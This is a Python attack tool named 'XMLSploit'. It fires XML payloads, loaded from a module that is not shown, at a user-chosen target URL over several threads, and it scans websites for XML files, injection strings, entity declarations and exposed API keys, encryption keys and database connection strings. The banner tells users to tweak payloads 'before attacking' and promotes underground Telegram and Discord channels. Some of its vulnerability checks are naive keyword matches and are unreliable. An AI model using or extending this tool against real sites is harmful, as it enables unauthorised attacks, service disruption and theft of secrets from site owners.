import requests
import concurrent.futures
from colorama import init, Fore
import pyfiglet
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from payloads import xml_payloads

# Initialize colorama for cross-platform ANSI color support
init()


def send_payload(url, payload):
  try:
    response = requests.post(url,
                             data=payload,
                             headers={"Content-Type": "text/xml"})
    print(
        f"Sent payload to {url}, Response status code: {response.status_code}")
  except Exception as e:
    print(f"Failed to send payload to {url}: {str(e)}")


def select_payload(xml_payloads):
  print(Fore.YELLOW + pyfiglet.figlet_format("Select Payload") + Fore.RESET)
  print(Fore.CYAN + "Select an XML payload:" + Fore.RESET)
  for i, (name, _) in enumerate(xml_payloads.items(), 1):
    print(Fore.GREEN + f"{i}. {name}" + Fore.RESET)

  while True:
    try:
      choice = int(input(Fore.YELLOW + "Enter your choice: " + Fore.RESET))
      if 1 <= choice <= len(xml_payloads):
        return list(xml_payloads.values())[choice - 1]
    except ValueError:
      pass
    print(
        Fore.RED +
        "Invalid choice. Please enter a number corresponding to the payload." +
        Fore.RESET)


def scan_website_for_xml(url, mode):
  try:
    if mode == "basic":
      response = requests.get(url)
      if response.status_code == 200:
        soup = BeautifulSoup(response.content, 'html.parser')
        xml_links = []
        for link in soup.find_all('a'):
          href = link.get('href')
          if href.endswith('.xml'):
            xml_links.append(urljoin(url, href))
        if xml_links:
          print("XML files found on the website:")
          for xml_link in xml_links:
            print(xml_link)
        else:
          print("No XML files found on the website.")
      else:
        print(
            f"Failed to retrieve content from {url}. Status code: {response.status_code}"
        )

    elif mode == "advanced":
      print("Fuzzing URLs...")
    fuzz_list = ["xml", "xsd", "dtd", "rss", "atom"]
    discovered_xml_urls = set()

    for fuzz in fuzz_list:
      fuzz_url = url + "/{}".format(fuzz)
      try:
        response = requests.get(fuzz_url)
        if response.status_code == 200 and response.headers.get(
            "Content-Type", "").startswith("text/xml"):
          discovered_xml_urls.add(fuzz_url)
      except Exception as e:
        pass

    if discovered_xml_urls:
      print("Discovered XML files:")
      for xml_url in discovered_xml_urls:
        print(xml_url)
        try:
          xml_response = requests.get(xml_url)
          if "SELECT" in xml_response.text.upper(
          ) and "FROM" in xml_response.text.upper():
            print("Potential SQL query found in:", xml_url)
          if "eval(" in xml_response.text.lower():
            print("Potential code injection found in:", xml_url)
          if "system(" in xml_response.text.lower():
            print("Potential command injection found in:", xml_url)
          if "/bin/bash" in xml_response.text.lower():
            print("Potential shell command found in:", xml_url)
          if "loadjava" in xml_response.text.lower():
            print("Potential Java code execution found in:", xml_url)
          if "XPathExpression" in xml_response.text:
            print("Potential XPath Injection found in:", xml_url)
          if "<Signature>" in xml_response.text:
            print("XML Signature found in:", xml_url)
            # Check for XML Signature Spoofing vulnerability
            if "spoofing" in xml_response.text.lower(
            ) or "tampering" in xml_response.text.lower():
              print("XML Signature Spoofing vulnerability detected in:",
                    xml_url)
          if "<!ENTITY" in xml_response.text:
            print("XML Entity Expansion found in:", xml_url)
            # Check for XML Bomb (Billion Laughs)
            if "ENTITY" in xml_response.text.upper(
            ) and "SYSTEM" in xml_response.text.upper():
              print("XML Bomb (Billion Laughs) detected in:", xml_url)
          if "<schema>" in xml_response.text:
            print("XML Schema found in:", xml_url)
            # Check for Schema Poisoning
            if "xmlns" in xml_response.text.lower(
            ) or "xsd:" in xml_response.text.lower():
              print("XML Schema Poisoning vulnerability detected in:", xml_url)

          # Extracting sensitive information
          xml_content = xml_response.text
          # Example: Extracting database connection strings
          if "jdbc:mysql://" in xml_content:
            print("Database connection string found in:", xml_url)
          if "<apikey>" in xml_content.lower():
            print("API keys found in:", xml_url)
          if "<encryption_key>" in xml_content.lower():
            print("Encryption keys found in:", xml_url)
          # Add more checks to extract sensitive information
        except Exception as e:
          print("Error occurred while analyzing XML:", str(e))
    else:
      print("No common XML files discovered.")

    # Analyzing robots.txt file
    robots_url = urljoin(url, "robots.txt")
    try:
      response = requests.get(robots_url)
      if response.status_code == 200:
        robots_content = response.text
        exclusions = [
            line.split(": ")[1].strip() for line in robots_content.split("\n")
            if line.startswith("Disallow")
        ]
        xml_exclusions = [
            exclusion for exclusion in exclusions if exclusion.endswith(".xml")
        ]
        if xml_exclusions:
          print("XML file exclusions found in robots.txt:")
          for exclusion in xml_exclusions:
            print(exclusion)
            # Consider further analysis if needed
        else:
          print("No XML file exclusions found in robots.txt.")
      else:
        print("Failed to retrieve robots.txt file.")
    except Exception as e:
      print("Error retrieving robots.txt file:", str(e))

  except Exception as e:
    print("Error occurred during scanning:", str(e))


def main():
  print(Fore.BLUE + pyfiglet.figlet_format("XMLSploit") + Fore.RESET)
  print(Fore.YELLOW + "Welcome to XMLSploit!" + Fore.RESET)
  print(Fore.RED + "You may want to modify some payloads before attacking \n" +
        Fore.RESET)
  print(Fore.CYAN + "Telegram: " + Fore.RESET + Fore.GREEN +
        "https://t.me/Cryptiques" + Fore.RESET)
  print(Fore.CYAN + "Discord: " + Fore.RESET + Fore.GREEN +
        "https://discord.gg/cyber-underground-900619671072567326" + Fore.RESET)

  while True:
    print("\nChoose an option:")
    print("1. Send XML payload to a target URL")
    print("2. Scan a website for XML files and vulns")
    print("3. Exit")

    option = input("Enter your choice: ")

    if option == "1":
      url = input(
          "\nEnter the target URL where the XML payload will be sent: ")
      payload = select_payload(xml_payloads)
      num_threads = int(
          input("\nEnter the number of threads (default is 1): ") or "1")
      print("\nSending payloads...")
      with concurrent.futures.ThreadPoolExecutor(
          max_workers=num_threads) as executor:
        futures = []
        for _ in range(num_threads):
          futures.append(executor.submit(send_payload, url, payload))

        for future in concurrent.futures.as_completed(futures):
          future.result()

    elif option == "2":
      url = input("\nEnter the website URL to scan for XML files: ")
      mode = input("\nChoose scanning mode (basic/advanced): ").lower()
      scan_website_for_xml(url, mode)

    elif option == "3":
      print("Exiting...")
      break

    else:
      print("Invalid option. Please choose again.")


if __name__ == "__main__":
  main()
